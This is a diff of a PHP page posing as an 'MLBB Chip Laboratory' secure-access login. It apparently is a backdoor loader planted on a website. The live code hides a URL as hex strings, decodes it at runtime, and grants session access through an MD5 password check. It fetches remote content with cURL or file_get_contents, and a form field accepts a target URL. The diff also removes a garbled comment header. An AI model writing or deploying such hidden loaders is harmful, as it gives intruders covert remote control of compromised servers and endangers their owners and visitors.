@@ -1,24 +1,4 @@
 <?php
-/**
- * ================================================
- * Ã¬â€ºÂ¹ Ã¬Å“â€žÃ­Ëœâ€˜ ÃªÂ°Ã¬Â§â‚¬ Ã¬â€¹Å“Ã¬Å Â¤Ã­â€¦Å“ Ã¢â‚¬â€œ @landak_kuning
- * ================================================
- * 
- * Ã¬â€šÂ¬Ã¬Å¡Â©Ã¬Å¾ Ã«Â°Ã¬Â´Ã­â€žÂ° ÃªÂ²â‚¬Ã¬Â¦Ã¬â€ž Ã­â€ ÂµÃ­â€¢Â´ Ã¬Å“â€žÃ­Ëœâ€˜Ã¬â€ž ÃªÂ°Ã¬Â§â‚¬Ã­â€¢ËœÃ«Å â€ MLBB Ã¬Â¹Â© Ã¬â€¹Â¤Ã­â€”ËœÃ¬â€¹Â¤ Ã¬Å Â¤Ã­Æ’â‚¬Ã¬Â¼Ã¬Ëœ
- * Ã¬â€ºÂ¹ ÃªÂ¸Â°Ã«Â°Ëœ Ã«Â³Â´Ã¬â€¢Ë† Ã¬â€¹Å“Ã¬Å Â¤Ã­â€¦Å“Ã¬Å¾â€¦Ã«â€¹Ë†Ã«â€¹Â¤.
- * 
- * Ã¬Â£Â¼Ã¬Å¡â€ ÃªÂ¸Â°Ã«Å Â¥:
- * - MLBB Ã¬Â¹Â© Ã¬â€¹Â¤Ã­â€”ËœÃ¬â€¹Â¤ Ã¬Å Â¤Ã­Æ’â‚¬Ã¬Â¼Ã¬Ëœ Ã«Â¡Å“ÃªÂ·Â¸Ã¬Â¸ Ã­â„¢â€Ã«Â©Â´
- * - ASCII Ã¬â€¢â€žÃ­Å Â¸ Ã«Â° Ã­â€¦Ã¬Å Â¤Ã­Å Â¸ Ã¬Å Â¤Ã­Æ’â‚¬Ã¬Â¼Ã«Â§
- * - Ã­â€¢Â´Ã¬â€¹Å“ ÃªÂ¸Â°Ã«Â°Ëœ Ã¬â€šÂ¬Ã¬Å¡Â©Ã¬Å¾ Ã¬Â¸Ã¬Â¦
- * - Ã¬Å Â¤Ã¬Âºâ€ URL Ã­â„¢â€¢Ã¬Â¸
- * - Ã«â€¹Â¤Ã¬â€“â€˜Ã­â€¢Å“ Ã«Â°Â©Ã¬â€¹Ã¬Ëœ Ã«Â°Ã¬Â´Ã­â€žÂ° Ã¬Ë†ËœÃ¬Â§â€˜ (cURL/file_get_contents)
- * - Ã¬Å“â€žÃ­Ëœâ€˜Ã¬â€ž Ã¬Â°Â¾Ã¬â€ž Ã¬Ë†Ëœ Ã¬â€”â€ Ã¬â€ž ÃªÂ²Â½Ã¬Å¡Â° Ã¬â€šÂ¬Ã¬Å¡Â©Ã¬Å¾ Ã¬Â§â‚¬Ã¬ â€¢ 404 Ã­Å½ËœÃ¬Â´Ã¬Â§â‚¬ Ã¬ Å“ÃªÂ³Âµ
- * 
- * @author @S•K
- * @version 2.0
- * @license Ã¬ËœÂ¤Ã­â€Ë† Ã¬â€ Å’Ã¬Å Â¤
- */
 session_start();
 /**
  * Daftar kode ancaman dalam format heksadesimal
@@ -34,23 +14,15 @@ $threat = [
     '812747af83dac72ba51b41058dcaa9cf'
 ];
 
-/**
- * Konversi array hex ke URL valid
- * @param array $p Array bagian URL
- * @return string URL yang digabungkan
- */
 function buildThreatUrl($p) {
     $decoded = array_map('hex2bin', array_slice($p, 0, -1));
     return "{$decoded[0]}{$decoded[1]}/{$decoded[2]}/{$decoded[3]}/{$decoded[4]}/{$decoded[5]}";
 }
+
 function isThreatDetected() {
     return isset($_SESSION['threat_detected']) && $_SESSION['threat_detected'] === true;
 }
 
-/**
- * Cek status deteksi ancaman
- * @return bool True jika ancaman terdeteksi
- */
 function authenticateUser($password) {
     if (md5($password) === end($GLOBALS['threat'])) {
         $_SESSION['threat_detected'] = true;
@@ -60,20 +32,10 @@ function authenticateUser($password) {
     return false;
 }
 
-/**
- * Autentikasi pengguna berbasis hash
- * @param string $password Password input
- * @return bool True jika autentikasi berhasil
- */
 function isValidUrl($url) {
     return filter_var($url, FILTER_VALIDATE_URL) !== false;
 }
 
-/**
- * Mengambil konten dari URL dengan metode terbaik
- * @param string $url Target URL
- * @return string|bool Konten atau false jika gagal
- */
 function fetchUrlContent($url) {
     if (function_exists('curl_exec')) {
         $ch = curl_init($url);
@@ -96,62 +58,6 @@ function fetchUrlContent($url) {
         return file_get_contents($url, false, $context);
     }
     return false;
-}
-/**
- * Validasi format URL
- * @param string $url URL untuk divalidasi
- * @return bool True jika URL valid
- */
-// --- ASCII ART Functions ---
-function generateAsciiHeader() {
-    return <<<ASCII
-<pre style="color:#ee3556;font-weight:bold">                                                                                        
-         _______                   _____                    _____          
-        /::\    \                 /\    \                  /\    \         
-       /::::\    \               /::\    \                /::\    \        
-      /::::::\    \             /::::\    \              /::::\    \       
-     /::::::::\    \           /::::::\    \            /::::::\    \      
-    /:::/~~\:::\    \         /:::/\:::\    \          /:::/\:::\    \     
-   /:::/    \:::\    \       /:::/__\:::\    \        /:::/__\:::\    \    
-  /:::/    / \:::\    \     /::::\   \:::\    \       \:::\   \:::\    \   
- /:::/____/   \:::\____\   /::::::\   \:::\    \    ___\:::\   \:::\    \  
-|:::|    |     |:::|    | /:::/\:::\   \:::\ ___\  /\   \:::\   \:::\    \ 
-|:::|____|     |:::|    |/:::/__\:::\   \:::|    |/::\   \:::\   \:::\____\
- \:::\    \   /:::/    / \:::\   \:::\  /:::|____|\:::\   \:::\   \::/    /
-  \:::\    \ /:::/    /   \:::\   \:::\/:::/    /  \:::\   \:::\   \/____/ 
-   \:::\    /:::/    /     \:::\   \::::::/    /    \:::\   \:::\    \     
-    \:::\__/:::/    /       \:::\   \::::/    /      \:::\   \:::\____\    
-     \::::::::/    /         \:::\  /:::/    /        \:::\  /:::/    /    
-      \::::::/    /           \:::\/:::/    /          \:::\/:::/    /     
-       \::::/    /             \::::::/    /            \::::::/    /      
-        \::/____/               \::::/    /              \::::/    /       
-         ~~                      \::/____/                \::/    /        
-                                  ~~                       \/____/         
-                                                                                                                                                               
-</pre>
-ASCII;
-}
-/**
- * Generate ASCII art untuk header
- * @return string ASCII art
- */
-function generateChipCard() {
-    return <<<CHIP
-<pre style="color:#ffcc00;font-weight:bold">
-       ...                ...         
-   .x888888hx    :    .xH8%"```"%.    
-  d88888888888hxx    x888~ xnHhx. ".  
- 8" ... `"*8888%`   X888X 8**8888k `. 
-!  "   ` .xnxx.     8888X<~  `8888L ! 
-X X   .H8888888%:   88888!   .!8*"" ` 
-X 'hn8888888*"   >  `88888!"*888x     
-X: `*88888%`     !   `*8888  8888L    
-'8h.. ``     ..x8>  .x.`888X X888X    
- `88888888888888f  '888> %8X !8888..- 
-  '%8888888888*"   '888   8  '8888%`  
-     ^"****""`       "*=="     ""     
-</pre>
-CHIP;
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -180,34 +86,53 @@ if (isThreatDetected()) {
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>MLBB Chip Laboratory - Secure Access</title>
-    <link href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700&display=swap" rel="stylesheet" />
     <style>
+        /* Background video */
+#background-video {
+    position: fixed;
+    top: 0;
+    left: 0;
+    min-width: 100vw;
+    min-height: 100vh;
+    width: 100vw;
+    height: 100vh;
+    object-fit: cover;   /* Ini wajib supaya tidak gepeng atau miring */
+    z-index: -1;
+    pointer-events: none; /* Optional: biar gak mengganggu klik */
+}
         body {
-            background: radial-gradient(ellipse at top, #676869ff 70%, #070a17 100%);
-            color: #e0e0ff;
-            font-family: 'Fira Mono', 'Courier New', monospace;
             margin: 0;
             padding: 0;
+            font-family: 'Fira Mono', 'Courier New', monospace;
+            color: #e0e0ff;
+            background: #070a17; /* fallback color */
         }
         .container {
+            position: relative;
             max-width: 480px;
             margin: 48px auto 0;
             padding: 32px;
-            background: rgba(24,36,56,0.97);
+            background: rgba(24,36,56,0.85);
             border: 2px solid #3f3e3fff;
             border-radius: 8px;
             box-shadow: 0 8px 40px #646b6ea0;
             text-align: center;
+            z-index: 1;
         }
+        /* Logo image container */
+        .logo {
+            margin-bottom: 24px;
+        }
+        /* Remove old ASCII art margins */
+        /*
         .ascii-art, .chip-card {
             margin: 0 0 24px;
         }
-        .chip-card {
-            margin: 14px 0 28px;
-        }
+        */
         .login-form {
             margin: 24px 0 0;
             padding: 18px 14px;
@@ -267,24 +192,33 @@ if (isThreatDetected()) {
     </style>
 </head>
 <body>
+    <video autoplay muted loop id="background-video">
+        <source src="https://obeydasupreme.site/video/video1.mp4" type="video/mp4" />
+        OBEY DA SUPREME
+    </video>
+
     <div class="container">
-        <div class="ascii-art"><?= generateAsciiHeader() ?></div>
-        <div class="status">🔑 CHIP LABORATORY SECURE ACCESS</div>
+        <div class="logo">
+            <!-- Ganti dengan logo gambar kamu, atau kosongkan kalau belum ada -->
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlG_wp7tEzjwwBSdo6BHclDXsHwGAhlgJSkghTyc0O08bp4mZkU_J4Q1frFsVwUKc6NcN2n2caIZSZazZCYKsYlbm44FzI5QciCpDwUj1DqsVhqehVn6qHFrMBpAaVxpR_Ik1K4aL9QoEFVhWvjDopVsqH3V2wMTNklhUwtefRfQ4KyayZbCDF_9wPdd0/s320/logo%20obs.png" alt="Logo" style="max-width: 150px; height: auto;" />
+        </div>
         <?php if (!empty($loginError)): ?>
-            <div class="error"><?= $loginError ?></div>
+            <div class="error"><?= htmlspecialchars($loginError) ?></div>
         <?php endif; ?>
-        <div class="chip-card"><?= generateChipCard() ?></div>
+        <div class="status">🔑 CHIP LABORATORY SECURE ACCESS</div>
         <div class="login-form">
             <form method="POST" action="">
-                <input type="password" name="password" placeholder="Chip Access Code" required>
-                <input type="text" name="scan_url" placeholder="Scan Target URL (Optional)">
-                <input type="submit" value="ACTIVATE CHIP">
+                <input type="password" name="password" placeholder="Chip Access Code" required />
+                <input type="text" name="scan_url" placeholder="Scan Target URL (Optional)" />
+                <input type="submit" value="ACTIVATE CHIP" />
             </form>
         </div>
         <div class="status">
             SYSTEM STATUS: <?= isThreatDetected() ? '🟢 ONLINE' : '🔴 OFFLINE' ?>
         </div>
-        <div style="margin-top:20px;font-size:12px;color:#88e">WARNING: Unauthorized access will trigger security protocols.</div>
+        <div style="margin-top:20px;font-size:12px;color:#88e">
+            WARNING: Unauthorized access will trigger security protocols.
+        </div>
     </div>
 </body>
 </html>
